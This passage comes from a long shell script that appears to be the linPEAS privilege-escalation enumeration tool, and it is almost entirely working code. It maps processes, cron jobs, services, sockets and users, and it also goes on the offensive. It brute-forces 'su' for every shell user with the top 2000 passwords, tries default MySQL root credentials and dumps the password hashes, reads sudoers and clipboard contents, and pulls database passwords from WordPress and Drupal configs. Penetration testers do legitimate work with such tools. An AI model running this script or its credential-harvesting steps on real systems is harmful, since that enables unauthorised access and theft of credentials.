    ps aux 2>/dev/null | grep -v "\[" | sort | sed "s,$Wfolders,${C}[1;31m&${C}[0m,g" | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$rootcommon,${C}[1;32m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m," | sed "s,$processesVB,${C}[1;31;103m&${C}[0m,g" | sed "s,$processesB,${C}[1;31m&${C}[0m,"
    echo ""

    #-- 2PCS) Binary processes permissions
    printf $Y"[+] "$GREEN"Binary processes permissions\n"$NC
    printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes\n"$NC
    ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null | sed "s,$Wfolders,${C}[1;31m&${C}[0m,g" | sed "s,$sh_usrs,${C}[1;31m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;31m&${C}[0m," | sed "s,root,${C}[1;32m&${C}[0m,"
  fi
  echo ""

  #-- 3PCS) Different processes 1 min
  if ! [ "$FAST" ] && ! [ "$SUPERFAST" ]; then
    printf $Y"[+] "$GREEN"Different processes executed during 1 min (interesting is low number of repetitions)\n"$NC
    printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs\n"$NC
    if [ "`ps -e --format cmd 2>/dev/null`" ]; then for i in $(seq 1 1250); do ps -e --format cmd >> $file.tmp1 2>/dev/null; sleep 0.05; done; sort $file.tmp1 2>/dev/null | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort -r -n | grep -E -v "\s*[1-9][0-9][0-9][0-9]"; rm $file.tmp1; fi
    echo ""
  fi

  #-- 4PCS) Cron
  printf $Y"[+] "$GREEN"Cron jobs\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-jobs\n"$NC
  crontab -l 2>/dev/null | sed "s,$Wfolders,${C}[1;31;103m&${C}[0m,g" | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
  ls -al /etc/cron* 2>/dev/null | sed "s,$cronjobsG,${C}[1;32m&${C}[0m,g" | sed "s,$cronjobsB,${C}[1;31m&${C}[0m,g"
  cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs /var/spool/anacron /etc/incron.d/* /var/spool/incron/* 2>/dev/null | grep -v "^#\|test \-x /usr/sbin/anacron\|run\-parts \-\-report /etc/cron.hourly\| root run-parts /etc/cron." | sed "s,$Wfolders,${C}[1;31;103m&${C}[0m,g" | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m,"  | sed "s,root,${C}[1;31m&${C}[0m,"
  crontab -l -u $USER 2>/dev/null
  echo ""

  #-- 5PSC) Services
  printf $Y"[+] "$GREEN"Services\n"$NC
  printf $B"[i] "$Y"Search for outdated versions\n"$NC
  (service --status-all || chkconfig --list || rc-status) 2>/dev/null || echo_not_found "service|chkconfig|rc-status" 
  echo ""

  #-- PSC) systemd PATH
  printf $Y"[+] "$GREEN"Systemd PATH\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path\n"$NC
  systemctl show-environment 2>/dev/null | grep "PATH" | sed "s,$Wfolders\|\./\|\.:\|:\.,${C}[1;31;103m&${C}[0m,g"
  WRITABLESYSTEMDPATH=`systemctl show-environment 2>/dev/null | grep "PATH" | grep "$Wfolders"`
  echo ""

  #-- PSC) .service files
  printf $Y"[+] "$GREEN"Analyzing .service files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#services\n"$NC
  services=$(echo "$FIND_ETC $FIND_LIB $FIND_RUN $FIND_USR $FIND_SYSTEMD $FIND_VAR $FIND_SYS $FIND_SNAP" | grep -E '\.service')
  for s in $services; do
    if [ -w "$s" ] && [ -f "$s" ]; then
      echo "$s" | sed "s,.*,${C}[1;31;103m&${C}[0m,g"
    fi
    servicebinpaths="`grep -Po '^Exec.*?=[!@+-]*[\w/\-]+' \"$s\" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,'`" #Get invoked paths
    for sp in $servicebinpaths; do
      if [ -w "$sp" ]; then
        echo "$s is calling this writable executable: $sp" | sed "s,writable.*,${C}[1;31;103m&${C}[0m,g"
      fi
    done
    if [ "$WRITABLESYSTEMDPATH" ]; then
      relpath1="`grep -E '^Exec.*=(?:[^/]|-[^/]|\+[^/]|![^/]|!![^/]|)[^/@\+!-].*' \"$s\" 2>/dev/null | grep -Iv \"=/\"`"
      relpath2="`grep -E '^Exec.*=.*/bin/[\w]*sh ' \"$s\" 2>/dev/null | grep -Ev \"/[\w]+/\"`"
      if [ "$relpath1" ] || [ "$relpath2" ]; then 
        echo "$s is executing some relative path" | sed "s,.*,${C}[1;31m&${C}[0m,";
      fi
    fi
  done
  if [ ! "$WRITABLESYSTEMDPATH" ]; then echo "You can't write on systemd PATH so I'm not going to list relative paths executed by services" | sed "s,.*,${C}[1;32m&${C}[0m,"; fi
  echo ""
  
  #-- PSC) Timers
  printf $Y"[+] "$GREEN"System timers\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers\n"$NC
  (systemctl list-timers --all 2>/dev/null | grep -Ev "(^$|timers listed)" | sed "s,$timersG,${C}[1;32m&${C}[0m,") || echo_not_found
  echo ""

  #-- PSC) .timer files
  printf $Y"[+] "$GREEN"Analyzing .timer files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers\n"$NC
  timers=$(echo "$FIND_ETC $FIND_LIB $FIND_RUN $FIND_USR $FIND_SYSTEMD $FIND_VAR $FIND_SYS $FIND_SNAP" | grep -E '\.timer')
  for t in $timers; do
    if [ -w "$t" ]; then
      echo "$t" | sed "s,.*,${C}[1;31m&${C}[0m,g"
    fi
    timerbinpaths="`grep -Po '^Unit=*(.*?$)' \"$t\" 2>/dev/null | cut -d '=' -f2`"
    for tb in $timerbinpaths; do
      if [ -w "$tb" ]; then
        echo "$t timer is calling this writable executable: $tb" | sed "s,writable.*,${C}[1;31m&${C}[0m,g"
      fi
    done
    #relpath="`grep -Po '^Unit=[^/].*' \"$t\" 2>/dev/null`"
    #for rp in "$relpath"; do
    #  echo "$t is calling a relative path: $rp" | sed "s,relative.*,${C}[1;31m&${C}[0m,g"
    #done
  done
  echo ""

  #-- PSC) .socket files
  printf $Y"[+] "$GREEN"Analyzing .socket files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets\n"$NC
  sockets=$(echo "$FIND_ETC $FIND_LIB $FIND_RUN $FIND_USR $FIND_SYSTEMD $FIND_VAR $FIND_SYS $FIND_SNAP" | grep -E '\.socket')
  for s in $sockets; do
    if [ -w "$s" ] && [ -f "$s" ]; then
      echo "Writable .socket file: $s" | sed "s,/.*,${C}[1;31m&${C}[0m,g"
    fi
    socketsbinpaths="`grep -Po '^(Exec).*?=[!@+-]*/[\w/\-]+' \"$s\" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,'`"
    for sb in $socketsbinpaths; do
      if [ -w "$sb" ]; then
        echo "$s is calling this writable executable: $sb" | sed "s,writable.*,${C}[1;31m&${C}[0m,g"
      fi
    done
    socketslistpaths="`grep -Po '^(Listen).*?=[!@+-]*/[\w/\-]+' \"$s\" 2>/dev/null | cut -d '=' -f2 | sed 's,^[@\+!-]*,,'`"
    for sl in $socketsbinpaths; do
      if [ -w "$sl" ]; then
        echo "$s is calling this writable listener: $sl" | sed "s,writable.*,${C}[1;31m&${C}[0m,g";
      fi
    done
  done
  echo ""

  #-- PSC) Search HTTP sockets
  printf $Y"[+] "$GREEN"HTTP sockets\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets\n"$NC
  for s in `ss -xlp -H state listening 2>/dev/null | grep -Eo "/.* " | cut -d " " -f1`; do
    socketcurl="`curl --max-time 2 --unix-socket \"$s\" http:/index 2>/dev/null`"
    if [ $? -eq 0 ]; then
      owner="`ls -l \"$s\" | cut -d ' ' -f 3`"
      echo "Socket $s owned by $owner uses HTTP. Response to /index:" | sed "s,$groupsB,${C}[1;31m&${C}[0m,g" | sed "s,$groupsVB,${C}[1;31m&${C}[0m,g" | sed "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed "s,root,${C}[1;31m&${C}[0m," | sed "s,$knw_grps,${C}[1;32m&${C}[0m,g" | sed "s,$idB,${C}[1;31m&${C}[0m,g"
      echo "$socketcurl"
    fi
  done
  echo ""

  #-- PSC) Writable and weak policies in D-Bus config files
  printf $Y"[+] "$GREEN"D-Bus config files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus\n"$NC
  dbusfols=$(echo "$FIND_DIR_ETC" | grep -E '/dbus-1/system.d|/dbus-1/session.d')
  if [ "$dbusfols" ]; then
    for d in "$dbusfols"; do
      for f in $d/*; do
        if [ -w "$f" ]; then
          echo "Writable $f" | sed "s,.*,${C}[1;31m&${C}[0m,g"
        fi

        if [ "`grep \"<policy>\" \"$f\" 2>/dev/null`" ]; then printf "Weak general policy found on $f\n" | sed "s,/.*,${C}[1;31m&${C}[0m,g"; fi
        if [ "`grep \"<policy user=\\\"$USER\\\">\" \"$f\" 2>/dev/null`" ]; then printf "Possible weak user policy found on $f\n" | sed "s,/.*,${C}[1;31m&${C}[0m,g"; fi
        for g in `groups`; do
          if [ "`grep \"<policy group=\\\"$g\\\">\" \"$f\" 2>/dev/null`" ]; then printf "Possible weak group ($g) policy found on $f\n" | sed "s,/.*,${C}[1;31m&${C}[0m,g"; fi
        done
        #TODO: identify allows in context="default"
      done
    done
  fi
  echo ""
  echo ""


  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep Net`" ]; then
  ###########################################
  #---------) Network Information (---------#
  ###########################################
  printf $B"===================================( "$GREEN"Network Information"$B" )====================================\n"$NC

  #-- 1NI) Hostname, hosts and DNS
  printf $Y"[+] "$GREEN"Hostname, hosts and DNS\n"$NC
  cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
  dnsdomainname 2>/dev/null || echo_not_found "dnsdomainname" 
  echo ""

  #-- 2NI) /etc/inetd.conf
  printf $Y"[+] "$GREEN"Content of /etc/inetd.conf & /etc/xinetd.conf\n"$NC
  (cat /etc/inetd.conf /etc/xinetd.conf 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null) || echo_not_found "/etc/inetd.conf" 
  echo ""

  #-- 3NI) Networks and neighbours
  printf $Y"[+] "$GREEN"Networks and neighbours\n"$NC
  cat /etc/networks 2>/dev/null
  (ifconfig || ip a) 2>/dev/null
  (route || ip n) 2>/dev/null
  echo ""

  #-- 4NI) Iptables
  printf $Y"[+] "$GREEN"Iptables rules\n"$NC
  (timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null) 2>/dev/null || echo_not_found "iptables rules"
  echo ""

  #-- 5NI) Ports
  printf $Y"[+] "$GREEN"Active Ports\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports\n"$NC
  (netstat -punta || ss --ntpu) 2>/dev/null | sed "s,127.0.0.1,${C}[1;31m&${C}[0m,"
  echo ""

  #-- 6NI) tcpdump
  printf $Y"[+] "$GREEN"Can I sniff with tcpdump?\n"$NC
  timeout 1 tcpdump >/dev/null 2>&1
  if [ $? -eq 124 ]; then #If 124, then timed out == It worked
      printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#sniffing\n"$NC
      echo "You can sniff with tcpdump!" | sed "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi
  echo ""
  echo ""
  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep UsrI`" ]; then
  ###########################################
  #----------) Users Information (----------#
  ###########################################
  printf $B"====================================( "$GREEN"Users Information"$B" )=====================================\n"$NC

  #-- 1UI) My user
  printf $Y"[+] "$GREEN"My user\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#groups\n"$NC
  (id || (whoami && groups)) 2>/dev/null | sed "s,$groupsB,${C}[1;31m&${C}[0m,g" | sed "s,$groupsVB,${C}[1;31;103m&${C}[0m,g" | sed "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed "s,root,${C}[1;31m&${C}[0m," | sed "s,$knw_grps,${C}[1;32m&${C}[0m,g" | sed "s,$idB,${C}[1;31m&${C}[0m,g"
  echo ""

  #-- 2UI) PGP keys?
  printf $Y"[+] "$GREEN"Do I have PGP keys?\n"$NC
  gpg --list-keys 2>/dev/null || echo_not_found "gpg"
  echo ""

  #-- 3UI) Clipboard and highlighted text
  printf $Y"[+] "$GREEN"Clipboard or highlighted text?\n"$NC
  if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null` | sed "s,$pwd_inside_history,${C}[1;31m&${C}[0m,"
    echo "Highlighted text: "`xclip -o 2>/dev/null` | sed "s,$pwd_inside_history,${C}[1;31m&${C}[0m,"
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null` | sed "s,$pwd_inside_history,${C}[1;31m&${C}[0m,"
    echo "Highlighted text: "`xsel -o 2>/dev/null` | sed "s,$pwd_inside_history,${C}[1;31m&${C}[0m,"
  else echo_not_found "xsel and xclip"
  fi
  echo ""

  #-- 4UI) Sudo -l
  printf $Y"[+] "$GREEN"Testing 'sudo -l' without password & /etc/sudoers\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands\n"$NC
  (echo '' | sudo -S -l | sed "s,_proxy,${C}[1;31m&${C}[0m,g" | sed "s,$sudoB,${C}[1;31m&${C}[0m,g" | sed "s,$sudoVB,${C}[1;31;103m&${C}[0m,") 2>/dev/null  || echo_not_found "sudo" 
  (cat /etc/sudoers | grep -v "^$" | grep -v "#" | sed "s,_proxy,${C}[1;31m&${C}[0m,g" | sed "s,$sudoB,${C}[1;31m&${C}[0m,g" | sed "s,pwfeedback,${C}[1;31m&${C}[0m,g" | sed "s,$sudoVB,${C}[1;31;103m&${C}[0m,") 2>/dev/null  || echo_not_found "/etc/sudoers" 
  echo ""

  #-- 5UI) Doas
  printf $Y"[+] "$GREEN"Checking /etc/doas.conf\n"$NC
  if [ "`cat /etc/doas.conf 2>/dev/null`" ]; then cat /etc/doas.conf 2>/dev/null | sed "s,$sh_usrs,${C}[1;31m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m," | sed "s,nopass,${C}[1;31m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$USER,${C}[1;31;103m&${C}[0m,"
  else echo_not_found "/etc/doas.conf"
  fi
  echo ""

  #-- 6UI) Pkexec policy
  printf $Y"[+] "$GREEN"Checking Pkexec policy\n"$NC
  (cat /etc/polkit-1/localauthority.conf.d/* 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | sed "s,$groupsB,${C}[1;31m&${C}[0m," | sed "s,$groupsVB,${C}[1;31m&${C}[0m," | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$USER,${C}[1;31;103m&${C}[0m," | sed "s,$GROUPS,${C}[1;31;103m&${C}[0m,") || echo_not_found "/etc/polkit-1/localauthority.conf.d"
  echo ""

  #-- 7UI) Brute su
  if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ] && ! [ "$IAMROOT" ]; then
    printf $Y"[+] "$GREEN"Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
    POSSIBE_SU_BRUTE=`check_if_su_brute`;
    if [ "$POSSIBE_SU_BRUTE" ]; then
      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
      for u in $SHELLUSERS; do
        echo "  Bruteforcing user $u..."
        su_brute_user_num $u $PASSTRY
      done
    else
      printf $GREEN"It's not possible to brute-force su.\n\n"$NC
    fi
  else
    printf $Y"[+] "$GREEN"Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)\n"$NC
  fi
  printf $Y"[+] "$GREEN"Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!\n"$NC
  echo ""

  #-- 8UI) Superusers
  printf $Y"[+] "$GREEN"Superusers\n"$NC
  awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;31;103m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
  echo ""

  #-- 9UI) Users with console
  printf $Y"[+] "$GREEN"Users with console\n"$NC
  cat /etc/passwd 2>/dev/null | grep "sh$" | sort | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
  echo ""

  #-- 10UI) All users & groups
  printf $Y"[+] "$GREEN"All users & groups\n"$NC
  for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort | sed "s,$groupsB,${C}[1;31m&${C}[0m,g" | sed "s,$groupsVB,${C}[1;31m&${C}[0m,g" | sed "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed "s,root,${C}[1;31m&${C}[0m," | sed "s,$knw_grps,${C}[1;32m&${C}[0m,g"
  echo ""

  #-- 11UI) Login now
  printf $Y"[+] "$GREEN"Login now\n"$NC
  w 2>/dev/null | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
  echo ""

  #-- 12UI) Last logons
  printf $Y"[+] "$GREEN"Last logons\n"$NC
  last 2>/dev/null | tail | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
  echo ""

  #-- 13UI) Login info
  printf $Y"[+] "$GREEN"Last time logon each user\n"$NC
  lastlog 2>/dev/null | grep -v "Never" | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
  echo ""

  #-- 14UI) Password policy
  printf $Y"[+] "$GREEN"Password policy\n"$NC
  grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 2>/dev/null || echo_not_found "/etc/login.defs"
  echo ""
  echo ""
  if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi
fi


if [ "`echo $CHECKS | grep SofI`" ]; then
  ###########################################
  #--------) Software Information (---------#
  ###########################################
  printf $B"===================================( "$GREEN"Software Information"$B" )===================================\n"$NC

  #-- 1SI) Mysql version
  printf $Y"[+] "$GREEN"MySQL version\n"$NC
  mysql --version 2>/dev/null || echo_not_found "mysql"
  echo ""

  #-- 2SI) Mysql connection root/root
  printf $Y"[+] "$GREEN"MySQL connection using default root/root ........... "$NC
  mysqlconnect=`mysqladmin -uroot -proot version 2>/dev/null`
  if [ "$mysqlconnect" ]; then
    echo "Yes" | sed "s,.*,${C}[1;31m&${C}[0m,"
    mysql -u root --password=root -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  #-- 3SI) Mysql connection root/toor
  printf $Y"[+] "$GREEN"MySQL connection using root/toor ................... "$NC
  mysqlconnect=`mysqladmin -uroot -ptoor version 2>/dev/null`
  if [ "$mysqlconnect" ]; then
    echo "Yes" | sed "s,.*,${C}[1;31m&${C}[0m,"
    mysql -u root --password=toor -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  #-- 4SI) Mysql connection root/NOPASS
  mysqlconnectnopass=`mysqladmin -uroot version 2>/dev/null`
  printf $Y"[+] "$GREEN"MySQL connection using root/NOPASS ................. "$NC
  if [ "$mysqlconnectnopass" ]; then
    echo "Yes" | sed "s,.*,${C}[1;31m&${C}[0m,"
    mysql -u root -e "SELECT User,Host,authentication_string FROM mysql.user;" 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"
  else echo_no
  fi

  #-- 5SI) Mysql credentials
  printf $Y"[+] "$GREEN"Searching mysql credentials and exec\n"$NC
  mysqldirs=$(echo "$FIND_DIR_ETC $FIND_DIR_USR $FIND_DIR_VAR" | grep -E '^/etc/.*mysql|/usr/var/lib/.*mysql|/var/lib/.*mysql' | grep -v "mysql/mysql")
  if [ "$mysqldirs" ]; then
    for d in $mysqldirs; do 
      dcnf=`find $d -name debian.cnf 2>/dev/null`
      for f in $dcnf; do
        if [ -r $f ]; then 
          echo "We can read the mysql debian.cnf. You can use this username/password to log in MySQL" | sed "s,.*,${C}[1;31m&${C}[0m,"
          cat "$f"
        fi
      done
      uMYD=`find $d -name user.MYD 2>/dev/null`
      for f in $uMYD; do
        if [ -r "$f" ]; then 
          echo "We can read the Mysql Hashes from $f" | sed "s,.*,${C}[1;31m&${C}[0m,"
          grep -oaE "[-_\.\*a-Z0-9]{3,}" $f | grep -v "mysql_native_password" 
        fi
      done
      user=`grep -lr "user\s*=" $d 2>/dev/null | grep -v "debian.cnf"`
      for f in $user; do
        if [ -r "$f" ]; then
          u=`cat "$f" | grep -v "#" | grep "user" | grep "=" 2>/dev/null`
          echo "From '$f' Mysql user: $u" | sed "s,$sh_usrs,${C}[1;96m&${C}[0m," | sed "s,$nosh_usrs,${C}[1;34m&${C}[0m," | sed "s,$knw_usrs,${C}[1;32m&${C}[0m," | sed "s,$USER,${C}[1;95m&${C}[0m," | sed "s,root,${C}[1;31m&${C}[0m,"
        fi
      done
      mycfg=`find $d -name my.cnf 2>/dev/null`
      for f in $mycfg; do
        if [ -r "$f" ]; then 
          echo "Found readable $f"
          cat "$f" | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | grep -v "^$" | sed "s,password.*,${C}[1;31m&${C}[0m,"
        fi
      done
      mysqlexec=`whereis lib_mysqludf_sys.so 2>/dev/null | grep "lib_mysqludf_sys\.so"`
      if [ "$mysqlexec" ]; then 
        echo "Found $mysqlexec"
        echo "If you can login in MySQL you can execute commands doing: SELECT sys_eval('id');" | sed "s,.*,${C}[1;31m&${C}[0m,"
      fi
    done
  else echo_not_found
  fi
  echo ""

  #-- 6SI) PostgreSQL info
  printf $Y"[+] "$GREEN"PostgreSQL version and pgadmin credentials\n"$NC
  postgver=`psql -V 2>/dev/null`
  postgdb=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'pgadmin.*\.db$')
  postgconfs=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'pg_hba\.conf$|postgresql\.conf$|pgsql\.conf$')
  if [ "$postgver" ] || [ "$postgdb" ] || [ "$postgconfs" ]; then
    if [ "$postgver" ]; then echo "Version: $postgver"; fi
    if [ "$postgdb" ]; then echo "PostgreSQL database: $postgdb" | sed "s,.*,${C}[1;31m&${C}[0m,"; fi
    for f in $postgconfs; do
      if [ -r "$f" ]; then 
        echo "Found readable $f"
        cat "$f" | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null | grep -v "^$" | sed "s,auth\|password\|md5\|user=\|pass=\|trust,${C}[1;31m&${C}[0m," 2>/dev/null
        echo ""
      fi
    done
  else echo_not_found
  fi
  echo ""

  #-- 7SI) PostgreSQL brute
  if [ "$TIMEOUT" ]; then  # In some OS (like OpenBSD) it will expect the password from console and will pause the script. Also, this OS doesn't have the "timeout" command so lets only use this checks in OS that has it.
  #checks to see if any postgres password exists and connects to DB 'template0' - following commands are a variant on this
    printf $Y"[+] "$GREEN"PostgreSQL connection to template0 using postgres/NOPASS ........ "$NC
    if [ "`timeout 1 psql -U postgres -d template0 -c 'select version()' 2>/dev/null`" ]; then echo "Yes" | sed "s,.*,${C}[1;31m&${C}[0m,"
    else echo_no
    fi

    printf $Y"[+] "$GREEN"PostgreSQL connection to template1 using postgres/NOPASS ........ "$NC
    if [ "`timeout 1 psql -U postgres -d template1 -c 'select version()' 2>/dev/null`" ]; then echo "Yes" | sed "s,.)*,${C}[1;31m&${C}[0m,"
    else echo_no
    fi

    printf $Y"[+] "$GREEN"PostgreSQL connection to template0 using pgsql/NOPASS ........... "$NC
    if [ "`timeout 1 psql -U pgsql -d template0 -c 'select version()' 2>/dev/null`" ]; then echo "Yes" | sed "s,.*,${C}[1;31m&${C}[0m,"
    else echo_no
    fi

    printf $Y"[+] "$GREEN"PostgreSQL connection to template1 using pgsql/NOPASS ........... "$NC
    if [ "`timeout 1 psql -U pgsql -d template1 -c 'select version()' 2> /dev/null`" ]; then echo "Yes" | sed "s,.*,${C}[1;31m&${C}[0m,"
    else echo_no
    fi
    echo ""
  fi

  #-- 8SI) Apache info
  printf $Y"[+] "$GREEN"Apache server info\n"$NC
  apachever=`apache2 -v 2>/dev/null; httpd -v 2>/dev/null`
  if [ "$apachever" ]; then
    echo "Version: $apachever"
    sitesenabled=$(echo "$FIND_DIR_VAR $FIND_DIR_ETC $FIND_DIR_HOME $FIND_DIR_ROOT $FIND_DIR_TMP $FIND_DIR_USR $FIND_DIR_OPT" | grep "sites-enabled")
    for d in $sitesenabled; do for f in "$d/*"; do grep "AuthType\|AuthName\|AuthUserFile" $f 2>/dev/null | sed "s,.*AuthUserFile.*,${C}[1;31m&${C}[0m,"; done; done
    if [ !"$sitesenabled" ]; then
      default00=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep "000-default")
      for f in $default00; do grep "AuthType\|AuthName\|AuthUserFile" "$f" 2>/dev/null | sed "s,.*AuthUserFile.*,${C}[1;31m&${C}[0m,"; done
    fi
    echo "PHP exec extensions"
    grep -R -B1 "httpd-php" /etc/apache2 2>/dev/null
  else echo_not_found
  fi
  echo ""

  #-- 9SI) PHP cookies files
  phpsess1=`ls /var/lib/php/sessions 2>/dev/null`
  phpsess2=$(echo "$FIND_TMP $FIND_VAR" | grep -E '/tmp/.*sess_.*|/var/tmp/.*sess_.*')
  printf $Y"[+] "$GREEN"Searching PHPCookies\n"$NC
  if [ "$phpsess1" ] || [ "$phpsess2" ]; then
    if [ "$phpsess1" ]; then ls /var/lib/php/sessions 2>/dev/null; fi
    if [ "$phpsess2" ]; then $(echo "$FIND_TMP $FIND_VAR" | grep -E '/tmp/.*sess_.*|/var/tmp/.*sess_.*'); fi
  else echo_not_found
  fi
  echo ""

  #-- 10SI) Wordpress user, password, databname and host
  printf $Y"[+] "$GREEN"Searching Wordpress wp-config.php files\n"$NC
  wp=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'wp-config\.php$')
  if [ "$wp" ]; then
    echo "wp-config.php files found:\n$wp"
    for f in $wp; do grep "PASSWORD\|USER\|NAME\|HOST" "$f" 2>/dev/null | sed "s,.*,${C}[1;31m&${C}[0m,"; done
  else echo_not_found "wp-config.php"
  fi
  echo ""

  #-- 10SI) Drupal user, password, databname and host
  printf $Y"[+] "$GREEN"Searching Drupal settings.php files\n"$NC
  drup=$(echo "$FIND_VAR $FIND_ETC $FIND_HOME $FIND_ROOT $FIND_TMP $FIND_USR $FIND_OPT" | grep -E 'settings\.php$')
  if [ "`echo $drup | grep '/default/settings.php'`" ]; then #Check path /default/settings.php
    echo "settings.php files found:\n$drup"
